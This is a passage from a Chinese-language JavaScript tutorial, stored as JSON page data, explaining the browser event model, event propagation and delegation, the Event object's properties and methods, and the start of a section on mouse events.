language-javascript\"><code>var canceled = !cb.dispatchEvent(event);\nif (canceled) {\n  console.log(&#039;事件取消&#039;);\n} else {\n  console.log(&#039;事件未取消&#039;);\n}</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"事件模型","link":"/events/model.html"}],"content":"\n        <h1>\n            <a href='#事件模型' class='header-anchor'>#</a>\n            <span>事件模型</span>\n        </h1>\n    \n        <h2>\n            <a href='#监听函数' class='header-anchor'>#</a>\n            <span>监听函数</span>\n        </h2>\n    <p>浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。这是事件驱动编程模式（event-driven）的主要编程方式。</p>\n<p>JavaScript 有三种方法，可以为事件绑定监听函数。</p>\n\n        <h3>\n            <a href='#HTML-的-on-属性' class='header-anchor'>#</a>\n            <span>HTML 的 on- 属性</span>\n        </h3>\n    <p>HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;body onload=&quot;doSomething()&quot;&gt;\n&lt;div onclick=&quot;console.log(&#039;触发事件&#039;)&quot;&gt;</code></pre><p>上面代码为<code>body</code>节点的<code>load</code>事件、<code>div</code>节点的<code>click</code>事件，指定了监听代码。一旦事件发生，就会执行这段代码。</p>\n<p>元素的事件监听属性，都是<code>on</code>加上事件名，比如<code>onload</code>就是<code>on + load</code>，表示<code>load</code>事件的监听代码。</p>\n<p>注意，这些属性的值是将会执行的代码，而不是一个函数。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;!-- 正确 --&gt;\n&lt;body onload=&quot;doSomething()&quot;&gt;\n\n&lt;!-- 错误 --&gt;\n&lt;body onload=&quot;doSomething&quot;&gt;</code></pre><p>一旦指定的事件发生，<code>on-</code>属性的值是原样传入 JavaScript 引擎执行。因此如果要执行函数，不要忘记加上一对圆括号。</p>\n<p>使用这个方法指定的监听代码，只会在冒泡阶段触发。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div onClick=&quot;console.log(2)&quot;&gt;\n  &lt;button onClick=&quot;console.log(1)&quot;&gt;点击&lt;/button&gt;\n&lt;/div&gt;</code></pre><p>上面代码中，<code>&lt;button&gt;</code>是<code>&lt;div&gt;</code>的子元素。<code>&lt;button&gt;</code>的<code>click</code>事件，也会触发<code>&lt;div&gt;</code>的<code>click</code>事件。由于<code>on-</code>属性的监听代码，只在冒泡阶段触发，所以点击结果是先输出<code>1</code>，再输出<code>2</code>，即事件从子元素开始冒泡到父元素。</p>\n<p>直接设置<code>on-</code>属性，与通过元素节点的<code>setAttribute</code>方法设置<code>on-</code>属性，效果是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.setAttribute(&#039;onclick&#039;, &#039;doSomething()&#039;);\n// 等同于\n// &lt;Element onclick=&quot;doSomething()&quot;&gt;</code></pre>\n        <h3>\n            <a href='#元素节点的事件属性' class='header-anchor'>#</a>\n            <span>元素节点的事件属性</span>\n        </h3>\n    <p>元素节点对象的事件属性，同样可以指定监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onload = doSomething;\n\ndiv.onclick = function (event) {\n  console.log(&#039;触发事件&#039;);\n};</code></pre><p>使用这个方法指定的监听函数，也是只会在冒泡阶段触发。</p>\n<p>注意，这种方法与 HTML 的<code>on-</code>属性的差异是，它的值是函数名（<code>doSomething</code>），而不像后者，必须给出完整的监听代码（<code>doSomething()</code>）。</p>\n\n        <h3>\n            <a href='#EventTarget.addEventListener()' class='header-anchor'>#</a>\n            <span>EventTarget.addEventListener()</span>\n        </h3>\n    <p>所有 DOM 节点实例都有<code>addEventListener</code>方法，用来为该节点定义事件的监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;load&#039;, doSomething, false);</code></pre><p><code>addEventListener</code>方法的详细介绍，参见<code>EventTarget</code>章节。</p>\n\n        <h3>\n            <a href='#小结' class='header-anchor'>#</a>\n            <span>小结</span>\n        </h3>\n    <p>上面三种方法，第一种“HTML 的 on- 属性”，违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此不推荐使用。</p>\n<p>第二种“元素节点的事件属性”的缺点在于，同一个事件只能定义一个监听函数，也就是说，如果定义两次<code>onclick</code>属性，后一次定义会覆盖前一次。因此，也不推荐使用。</p>\n<p>第三种<code>EventTarget.addEventListener</code>是推荐的指定监听函数的方法。它有如下优点：</p>\n<ul>\n<li>同一个事件可以添加多个监听函数。</li>\n<li>能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。</li>\n<li>除了 DOM 节点，其他对象（比如<code>window</code>、<code>XMLHttpRequest</code>等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。</li>\n</ul>\n\n        <h2>\n            <a href='#this-的指向' class='header-anchor'>#</a>\n            <span>this 的指向</span>\n        </h2>\n    <p>监听函数内部的<code>this</code>指向触发事件的那个元素节点。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;button id=&quot;btn&quot; onclick=&quot;console.log(this.id)&quot;&gt;点击&lt;/button&gt;</code></pre><p>执行上面代码，点击后会输出<code>btn</code>。</p>\n<p>其他两种监听函数的写法，<code>this</code>的指向也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;\nvar btn = document.getElementById(&#039;btn&#039;);\n\n// 写法一\nbtn.onclick = function () {\n  console.log(this.id);\n};\n\n// 写法二\nbtn.addEventListener(\n  &#039;click&#039;,\n  function (e) {\n    console.log(this.id);\n  },\n  false\n);</code></pre><p>上面两种写法，点击按钮以后也是输出<code>btn</code>。</p>\n\n        <h2>\n            <a href='#事件的传播' class='header-anchor'>#</a>\n            <span>事件的传播</span>\n        </h2>\n    <p>一个事件发生后，会在子元素和父元素之间传播（propagation）。这种传播分成三个阶段。</p>\n<ul>\n<li><strong>第一阶段</strong>：从<code>window</code>对象传导到目标节点（上层传到底层），称为“捕获阶段”（capture phase）。</li>\n<li><strong>第二阶段</strong>：在目标节点上触发，称为“目标阶段”（target phase）。</li>\n<li><strong>第三阶段</strong>：从目标节点传导回<code>window</code>对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。</li>\n</ul>\n<p>这种三阶段的传播模型，使得同一个事件会在多个节点上触发。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;\n  &lt;p&gt;点击&lt;/p&gt;\n&lt;/div&gt;</code></pre><p>上面代码中，<code>&lt;div&gt;</code>节点之中有一个<code>&lt;p&gt;</code>节点。</p>\n<p>如果对这两个节点，都设置<code>click</code>事件的监听函数（每个节点的捕获阶段和监听阶段，各设置一个监听函数），共计设置四个监听函数。然后，对<code>&lt;p&gt;</code>点击，<code>click</code>事件会触发四次。</p>\n<pre class=\"prettyprint language-javascript\"><code>var phases = {\n  1: &#039;capture&#039;,\n  2: &#039;target&#039;,\n  3: &#039;bubble&#039;\n};\n\nvar div = document.querySelector(&#039;div&#039;);\nvar p = document.querySelector(&#039;p&#039;);\n\ndiv.addEventListener(&#039;click&#039;, callback, true);\np.addEventListener(&#039;click&#039;, callback, true);\ndiv.addEventListener(&#039;click&#039;, callback, false);\np.addEventListener(&#039;click&#039;, callback, false);\n\nfunction callback(event) {\n  var tag = event.currentTarget.tagName;\n  var phase = phases[event.eventPhase];\n  console.log(&quot;Tag: &#039;&quot; + tag + &quot;&#039;. EventPhase: &#039;&quot; + phase + &quot;&#039;&quot;);\n}\n\n// 点击以后的结果\n// Tag: &#039;DIV&#039;. EventPhase: &#039;capture&#039;\n// Tag: &#039;P&#039;. EventPhase: &#039;target&#039;\n// Tag: &#039;P&#039;. EventPhase: &#039;target&#039;\n// Tag: &#039;DIV&#039;. EventPhase: &#039;bubble&#039;</code></pre><p>上面代码表示，<code>click</code>事件被触发了四次：<code>&lt;div&gt;</code>节点的捕获阶段和冒泡阶段各1次，<code>&lt;p&gt;</code>节点的目标阶段触发了2次。</p>\n<ol>\n<li>捕获阶段：事件从<code>&lt;div&gt;</code>向<code>&lt;p&gt;</code>传播时，触发<code>&lt;div&gt;</code>的<code>click</code>事件；</li>\n<li>目标阶段：事件从<code>&lt;div&gt;</code>到达<code>&lt;p&gt;</code>时，触发<code>&lt;p&gt;</code>的<code>click</code>事件；</li>\n<li>冒泡阶段：事件从<code>&lt;p&gt;</code>传回<code>&lt;div&gt;</code>时，再次触发<code>&lt;div&gt;</code>的<code>click</code>事件。</li>\n</ol>\n<p>其中，<code>&lt;p&gt;</code>节点有两个监听函数（<code>addEventListener</code>方法第三个参数的不同，会导致绑定两个监听函数），因此它们都会因为<code>click</code>事件触发一次。所以，<code>&lt;p&gt;</code>会在<code>target</code>阶段有两次输出。</p>\n<p>注意，浏览器总是假定<code>click</code>事件的目标节点，就是点击位置嵌套最深的那个节点（本例是<code>&lt;div&gt;</code>节点里面的<code>&lt;p&gt;</code>节点）。所以，<code>&lt;p&gt;</code>节点的捕获阶段和冒泡阶段，都会显示为<code>target</code>阶段。</p>\n<p>事件传播的最上层对象是<code>window</code>，接着依次是<code>document</code>，<code>html</code>（<code>document.documentElement</code>）和<code>body</code>（<code>document.body</code>）。也就是说，上例的事件传播顺序，在捕获阶段依次为<code>window</code>、<code>document</code>、<code>html</code>、<code>body</code>、<code>div</code>、<code>p</code>，在冒泡阶段依次为<code>p</code>、<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>window</code>。</p>\n\n        <h2>\n            <a href='#事件的代理' class='header-anchor'>#</a>\n            <span>事件的代理</span>\n        </h2>\n    <p>由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理（delegation）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var ul = document.querySelector(&#039;ul&#039;);\n\nul.addEventListener(&#039;click&#039;, function (event) {\n  if (event.target.tagName.toLowerCase() === &#039;li&#039;) {\n    // some code\n  }\n});</code></pre><p>上面代码中，<code>click</code>事件的监听函数定义在<code>&lt;ul&gt;</code>节点，但是实际上，它处理的是子节点<code>&lt;li&gt;</code>的<code>click</code>事件。这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，而不用在每个<code>&lt;li&gt;</code>节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。</p>\n<p>如果希望事件到某个节点为止，不再传播，可以使用事件对象的<code>stopPropagation</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 事件传播到 p 元素后，就不再向下传播了\np.addEventListener(&#039;click&#039;, function (event) {\n  event.stopPropagation();\n}, true);\n\n// 事件冒泡到 p 元素后，就不再向上冒泡了\np.addEventListener(&#039;click&#039;, function (event) {\n  event.stopPropagation();\n}, false);</code></pre><p>上面代码中，<code>stopPropagation</code>方法分别在捕获阶段和冒泡阶段，阻止了事件的传播。</p>\n<p>但是，<code>stopPropagation</code>方法只会阻止事件的传播，不会阻止该事件触发<code>&lt;p&gt;</code>节点的其他<code>click</code>事件的监听函数。也就是说，不是彻底取消<code>click</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>p.addEventListener(&#039;click&#039;, function (event) {\n  event.stopPropagation();\n  console.log(1);\n});\n\np.addEventListener(&#039;click&#039;, function(event) {\n  // 会触发\n  console.log(2);\n});</code></pre><p>上面代码中，<code>p</code>元素绑定了两个<code>click</code>事件的监听函数。<code>stopPropagation</code>方法只能阻止这个事件的传播，不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是1，然后是2。</p>\n<p>如果想要彻底取消该事件，不再触发后面所有<code>click</code>的监听函数，可以使用<code>stopImmediatePropagation</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>p.addEventListener(&#039;click&#039;, function (event) {\n  event.stopImmediatePropagation();\n  console.log(1);\n});\n\np.addEventListener(&#039;click&#039;, function(event) {\n  // 不会被触发\n  console.log(2);\n});</code></pre><p>上面代码中，<code>stopImmediatePropagation</code>方法可以彻底取消这个事件，使得后面绑定的所有<code>click</code>监听函数都不再触发。所以，只会输出1，不会输出2。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"Event 对象","link":"/events/event.html"}],"content":"\n        <h1>\n            <a href='#Event-对象' class='header-anchor'>#</a>\n            <span>Event 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>事件发生以后，会产生一个事件对象，作为参数传给监听函数。浏览器原生提供一个<code>Event</code>对象，所有的事件都是这个对象的实例，或者说继承了<code>Event.prototype</code>对象。</p>\n<p><code>Event</code>对象本身就是一个构造函数，可以用来生成新的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>event = new Event(type, options);</code></pre><p><code>Event</code>构造函数接受两个参数。第一个参数<code>type</code>是字符串，表示事件的名称；第二个参数<code>options</code>是一个对象，表示事件对象的配置。该对象主要有下面两个属性。</p>\n<ul>\n<li><code>bubbles</code>：布尔值，可选，默认为<code>false</code>，表示事件对象是否冒泡。</li>\n<li><code>cancelable</code>：布尔值，可选，默认为<code>false</code>，表示事件是否可以被取消，即能否用<code>Event.preventDefault()</code>取消这个事件。一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var ev = new Event(\n  &#039;look&#039;,\n  {\n    &#039;bubbles&#039;: true,\n    &#039;cancelable&#039;: false\n  }\n);\ndocument.dispatchEvent(ev);</code></pre><p>上面代码新建一个<code>look</code>事件实例，然后使用<code>dispatchEvent</code>方法触发该事件。</p>\n<p>注意，如果不是显式指定<code>bubbles</code>属性为<code>true</code>，生成的事件就只能在“捕获阶段”触发监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;div&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;\nvar div = document.querySelector(&#039;div&#039;);\nvar p = document.querySelector(&#039;p&#039;);\n\nfunction callback(event) {\n  var tag = event.currentTarget.tagName;\n  console.log(&#039;Tag: &#039; + tag); // 没有任何输出\n}\n\ndiv.addEventListener(&#039;click&#039;, callback, false);\n\nvar click = new Event(&#039;click&#039;);\np.dispatchEvent(click);</code></pre><p>上面代码中，<code>p</code>元素发出一个<code>click</code>事件，该事件默认不会冒泡。<code>div.addEventListener</code>方法指定在冒泡阶段监听，因此监听函数不会触发。如果写成<code>div.addEventListener(&#39;click&#39;, callback, true)</code>，那么在“捕获阶段”可以监听到这个事件。</p>\n<p>另一方面，如果这个事件在<code>div</code>元素上触发。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.dispatchEvent(click);</code></pre><p>那么，不管<code>div</code>元素是在冒泡阶段监听，还是在捕获阶段监听，都会触发监听函数。因为这时<code>div</code>元素是事件的目标，不存在是否冒泡的问题，<code>div</code>元素总是会接收到事件，因此导致监听函数生效。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#Event.bubbles，Event.eventPhase' class='header-anchor'>#</a>\n            <span>Event.bubbles，Event.eventPhase</span>\n        </h3>\n    <p><code>Event.bubbles</code>属性返回一个布尔值，表示当前事件是否会冒泡。该属性为只读属性，一般用来了解 Event 实例是否可以冒泡。前面说过，除非显式声明，<code>Event</code>构造函数生成的事件，默认是不冒泡的。</p>\n<p><code>Event.eventPhase</code>属性返回一个整数常量，表示事件目前所处的阶段。该属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>var phase = event.eventPhase;</code></pre><p><code>Event.eventPhase</code>的返回值有四种可能。</p>\n<ul>\n<li>0，事件目前没有发生。</li>\n<li>1，事件目前处于捕获阶段，即处于从祖先节点向目标节点的传播过程中。</li>\n<li>2，事件到达目标节点，即<code>Event.target</code>属性指向的那个节点。</li>\n<li>3，事件处于冒泡阶段，即处于从目标节点向祖先节点的反向传播过程中。</li>\n</ul>\n\n        <h3>\n            <a href='#Event.cancelable，Event.cancelBubble，event.defaultPrevented' class='header-anchor'>#</a>\n            <span>Event.cancelable，Event.cancelBubble，event.defaultPrevented</span>\n        </h3>\n    <p><code>Event.cancelable</code>属性返回一个布尔值，表示事件是否可以取消。该属性为只读属性，一般用来了解 Event 实例的特性。</p>\n<p>大多数浏览器的原生事件是可以取消的。比如，取消<code>click</code>事件，点击链接将无效。但是除非显式声明，<code>Event</code>构造函数生成的事件，默认是不可以取消的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var evt = new Event(&#039;foo&#039;);\nevt.cancelable  // false</code></pre><p>当<code>Event.cancelable</code>属性为<code>true</code>时，调用<code>Event.preventDefault()</code>就可以取消这个事件，阻止浏览器对该事件的默认行为。</p>\n<p>如果事件不能取消，调用<code>Event.preventDefault()</code>会没有任何效果。所以使用这个方法之前，最好用<code>Event.cancelable</code>属性判断一下是否可以取消。</p>\n<pre class=\"prettyprint language-javascript\"><code>function preventEvent(event) {\n  if (event.cancelable) {\n    event.preventDefault();\n  } else {\n    console.warn(&#039;This event couldn\\&#039;t be canceled.&#039;);\n    console.dir(event);\n  }\n}</code></pre><p><code>Event.cancelBubble</code>属性是一个布尔值，如果设为<code>true</code>，相当于执行<code>Event.stopPropagation()</code>，可以阻止事件的传播。</p>\n<p><code>Event.defaultPrevented</code>属性返回一个布尔值，表示该事件是否调用过<code>Event.preventDefault</code>方法。该属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (event.defaultPrevented) {\n  console.log(&#039;该事件已经取消了&#039;);\n}</code></pre>\n        <h3>\n            <a href='#Event.currentTarget，Event.target' class='header-anchor'>#</a>\n            <span>Event.currentTarget，Event.target</span>\n        </h3>\n    <p><code>Event.currentTarget</code>属性返回事件当前所在的节点，即正在执行的监听函数所绑定的那个节点。</p>\n<p><code>Event.target</code>属性返回原始触发事件的那个节点，即事件最初发生的节点。事件传播过程中，不同节点的监听函数内部的<code>Event.target</code>与<code>Event.currentTarget</code>属性的值是不一样的，前者总是不变的，后者则是指向监听函数所在的那个节点对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML代码为\n// &lt;p id=&quot;para&quot;&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/p&gt;\nfunction hide(e) {\n  console.log(this === e.currentTarget);  // 总是 true\n  console.log(this === e.target);  // 有可能不是 true\n  e.target.style.visibility = &#039;hidden&#039;;\n}\n\npara.addEventListener(&#039;click&#039;, hide, false);</code></pre><p>上面代码中，如果在<code>para</code>节点的<code>&lt;em&gt;</code>子节点上面点击，则<code>e.target</code>指向<code>&lt;em&gt;</code>子节点，导致<code>&lt;em&gt;</code>子节点（即 World 部分）会不可见。如果点击 Hello  部分，则整个<code>para</code>都将不可见。</p>\n\n        <h3>\n            <a href='#Event.type' class='header-anchor'>#</a>\n            <span>Event.type</span>\n        </h3>\n    <p><code>Event.type</code>属性返回一个字符串，表示事件类型。事件的类型是在生成事件的时候。该属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>var evt = new Event(&#039;foo&#039;);\nevt.type // &quot;foo&quot;</code></pre>\n        <h3>\n            <a href='#Event.timeStamp' class='header-anchor'>#</a>\n            <span>Event.timeStamp</span>\n        </h3>\n    <p><code>Event.timeStamp</code>属性返回一个毫秒时间戳，表示事件发生的时间。它是相对于网页加载成功开始计算的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var evt = new Event(&#039;foo&#039;);\nevt.timeStamp // 3683.6999999995896</code></pre><p>它的返回值有可能是整数，也有可能是小数（高精度时间戳），取决于浏览器的设置。</p>\n<p>下面是一个计算鼠标移动速度的例子，显示每秒移动的像素数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var previousX;\nvar previousY;\nvar previousT;\n\nwindow.addEventListener(&#039;mousemove&#039;, function(event) {\n  if (\n    previousX !== undefined &amp;&amp;\n    previousY !== undefined &amp;&amp;\n    previousT !== undefined\n  ) {\n    var deltaX = event.screenX - previousX;\n    var deltaY = event.screenY - previousY;\n    var deltaD = Math.sqrt(Math.pow(deltaX, 2) + Math.pow(deltaY, 2));\n\n    var deltaT = event.timeStamp - previousT;\n    console.log(deltaD / deltaT * 1000);\n  }\n\n  previousX = event.screenX;\n  previousY = event.screenY;\n  previousT = event.timeStamp;\n});</code></pre>\n        <h3>\n            <a href='#Event.isTrusted' class='header-anchor'>#</a>\n            <span>Event.isTrusted</span>\n        </h3>\n    <p><code>Event.isTrusted</code>属性返回一个布尔值，表示该事件是否由真实的用户行为产生。比如，用户点击链接会产生一个<code>click</code>事件，该事件是用户产生的；<code>Event</code>构造函数生成的事件，则是脚本产生的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var evt = new Event(&#039;foo&#039;);\nevt.isTrusted // false</code></pre><p>上面代码中，<code>evt</code>对象是脚本产生的，所以<code>isTrusted</code>属性返回<code>false</code>。</p>\n\n        <h3>\n            <a href='#Event.detail' class='header-anchor'>#</a>\n            <span>Event.detail</span>\n        </h3>\n    <p><code>Event.detail</code>属性只有浏览器的 UI （用户界面）事件才具有。该属性返回一个数值，表示事件的某种信息。具体含义与事件类型相关。比如，对于<code>click</code>和<code>dbclick</code>事件，<code>Event.detail</code>是鼠标按下的次数（<code>1</code>表示单击，<code>2</code>表示双击，<code>3</code>表示三击）；对于鼠标滚轮事件，<code>Event.detail</code>是滚轮正向滚动的距离，负值就是负向滚动的距离，返回值总是3的倍数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;p&gt;Hello&lt;/p&gt;\nfunction giveDetails(e) {\n  console.log(e.detail);\n}\n\ndocument.querySelector(&#039;p&#039;).onclick = giveDetails;</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Event.preventDefault()' class='header-anchor'>#</a>\n            <span>Event.preventDefault()</span>\n        </h3>\n    <p><code>Event.preventDefault</code>方法取消浏览器对当前事件的默认行为。比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。该方法生效的前提是，事件对象的<code>cancelable</code>属性为<code>true</code>，如果为<code>false</code>，调用该方法没有任何效果。</p>\n<p>注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播。如果要阻止传播，可以使用<code>stopPropagation()</code>或<code>stopImmediatePropagation()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;input type=&quot;checkbox&quot; id=&quot;my-checkbox&quot; /&gt;\nvar cb = document.getElementById(&#039;my-checkbox&#039;);\n\ncb.addEventListener(\n  &#039;click&#039;,\n  function (e){ e.preventDefault(); },\n  false\n);</code></pre><p>上面代码中，浏览器的默认行为是单击会选中单选框，取消这个行为，就导致无法选中单选框。</p>\n<p>利用这个方法，可以为文本输入框设置校验条件。如果用户的输入不符合条件，就无法将字符输入文本框。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;input type=&quot;text&quot; id=&quot;my-input&quot; /&gt;\nvar input = document.getElementById(&#039;my-input&#039;);\ninput.addEventListener(&#039;keypress&#039;, checkName, false);\n\nfunction checkName(e) {\n  if (e.charCode &lt; 97 || e.charCode &gt; 122) {\n    e.preventDefault();\n  }\n}</code></pre><p>上面代码为文本框的<code>keypress</code>事件设定监听函数后，将只能输入小写字母，否则输入事件的默认行为（写入文本框）将被取消，导致不能向文本框输入内容。</p>\n\n        <h3>\n            <a href='#Event.stopPropagation()' class='header-anchor'>#</a>\n            <span>Event.stopPropagation()</span>\n        </h3>\n    <p><code>stopPropagation</code>方法阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，但是不包括在当前节点上其他的事件监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function stopEvent(e) {\n  e.stopPropagation();\n}\n\nel.addEventListener(&#039;click&#039;, stopEvent, false);</code></pre><p>上面代码中，<code>click</code>事件将不会进一步冒泡到<code>el</code>节点的父节点。</p>\n\n        <h3>\n            <a href='#Event.stopImmediatePropagation()' class='header-anchor'>#</a>\n            <span>Event.stopImmediatePropagation()</span>\n        </h3>\n    <p><code>Event.stopImmediatePropagation</code>方法阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。也就是说，该方法阻止事件的传播，比<code>Event.stopPropagation()</code>更彻底。</p>\n<p>如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。只要其中有一个监听函数调用了<code>Event.stopImmediatePropagation</code>方法，其他的监听函数就不会再执行了。</p>\n<pre class=\"prettyprint language-javascript\"><code>function l1(e){\n  e.stopImmediatePropagation();\n}\n\nfunction l2(e){\n  console.log(&#039;hello world&#039;);\n}\n\nel.addEventListener(&#039;click&#039;, l1, false);\nel.addEventListener(&#039;click&#039;, l2, false);</code></pre><p>上面代码在<code>el</code>节点上，为<code>click</code>事件添加了两个监听函数<code>l1</code>和<code>l2</code>。由于<code>l1</code>调用了<code>event.stopImmediatePropagation</code>方法，所以<code>l2</code>不会被调用。</p>\n\n        <h3>\n            <a href='#Event.composedPath()' class='header-anchor'>#</a>\n            <span>Event.composedPath()</span>\n        </h3>\n    <p><code>Event.composedPath()</code>返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div&gt;\n//   &lt;p&gt;Hello&lt;/p&gt;\n// &lt;/div&gt;\nvar div = document.querySelector(&#039;div&#039;);\nvar p = document.querySelector(&#039;p&#039;);\n\ndiv.addEventListener(&#039;click&#039;, function (e) {\n  console.log(e.composedPath());\n}, false);\n// [p, div, body, html, document, Window]</code></pre><p>上面代码中，<code>click</code>事件的最底层节点是<code>p</code>，向上依次是<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>Window</code>。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"鼠标事件","link":"/events/mouse.html"}],"content":"\n        <h1>\n            <a href='#鼠标事件' class='header-anchor'>#</a>\n            <span>鼠标事件</span>\n        </h1>\n    \n        <h2>\n            <a href='#鼠标事件的种类' class='header-anchor'>#</a>\n            <span>鼠标事件的种类</span>\n        </h2>\n    <p>鼠标事件指与鼠标相关的事件，继承了<code>MouseEvent</code>接口。具体的事件主要有以下一些。</p>\n<ul>\n<li><code>click</code>：按下鼠标（通常是按下主按钮）时触发。</li>\n<li><code>dblclick</code>：在同一个元素上双击鼠标时触发。</li>\n<li><code>mousedown</code>：按下鼠标键时触发。</li>\n<li><code>mouseup</code>：释放按下的鼠标键时触发。</li>\n<li><code>mousemove</code>：当鼠标在一个节点内部移动时触发。当鼠标持续移动时，该事件会连续触发。为了避免性能问题，建议对该事件的监听函数做一些限定，比如限定一段时间内只能运行一次。</li>\n<li><code>mouseenter</code>：鼠标进入一个节点时触发，进入子节点不会触发这个事件（详见后文）。</li>\n<li><code>mouseover</code>：鼠标进入一个节点时触发，进入子节点会再一次触发这个事件（详见后文）。</li>\n<li><code>mouseout</code>：鼠标离开一个节点时触发，离开父节点也会触发这个事件（详见后文）。</li>\n<li><code>mouseleave</code>：鼠标离开一个节点时触发，离开父节点不会触发这个事件（详见后文）。</li>\n<li><code>contextmenu</code>：按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文菜单键”时触发。</li>\n<li><code>wheel</code>：滚动鼠标的滚轮时触发，该事件继承的是<code>WheelEvent</code>接口。</li>\n</ul>\n<p><code>click</code>事件指的是，用户在同一个位置先完成<code>mousedown</code>动作，再完成<code>mouseup</code>动作。因此，触发顺序是，<code>mousedown</code>首先触发，<code>mouseup</code>接着触发，<code>click</code>最后触发。</p>\n<p><code>dblclick</code>事件则会在<code>mousedown</code>、<code>mouseup</code>、<code>click</code>之后触发。</p>\n<p><code>mouseover</code>事件和<code>mouseenter</code>事件，都是鼠标进入一个节点时触发。两者的区别是，<code>mouseenter</code>事件只触发一次，而只要鼠标在节点内部移动，<code>mouseover</code>事件会在子节点上触发多次。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n &lt;ul&gt;\n   &lt;li&gt;item 1&lt;/li&gt;\n   &lt;li&gt;item 2&lt;/li&gt;\n  &lt;li&gt;item 3&lt;/li&gt;\n &lt;/ul&gt;\n*/\n\nvar ul = document.querySelector(&#039;ul&#039;);\n\n// 进入 ul 节点以后，mouseenter 事件只会触发一次\n// 以后只要鼠标在节点内移动，都不会再触发这个事件\n// event.target 是 ul 节点\nul.addEventListener(&#039;mouseenter&#039;, function (event) {\n  event.target.style.color = &#039;purple&#039;;\n  setTimeout(function () {\n    event.target.style.color = &#039;&#039;;\n  }, 500);\n}, false);\n\n// 进入 ul 节点以后，只要在子节点上移动，mouseover 事件会触发多次\n// event.target 是 li 节点\nul.addEventListener(&#039;mouseover&#039;, function (event) {\n  event.target.style.color = &#039;orange&#039;;\n  setTimeout(function () {\n    event.target.style.color = &#039;&#039;;\n  }, 500);\n}, false);</code></pre><p>上面代码中，在父节点内部进入子节点，不会触发<code>mouseenter</code>事件，但是会触发<code>mouseover</code>事件。</p>\n<p><code>mouseout</code>事件和<code>mouseleave</code>事件，都是鼠标离开一个节点时触发。两者的区别是，在父元素内部离开一个子元素时，<code>mouseleave</code>事件不会触发，而<code>mouseout</code>事件会触发。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n &lt;ul&gt;\n   &lt;li&gt;item 1&lt;/li&gt;\n   &lt;li&gt;item 2&lt;/li&gt;\n  &lt;li&gt;item 3&lt;/li&gt;\n &lt;/ul&gt;\n*/\n\nvar 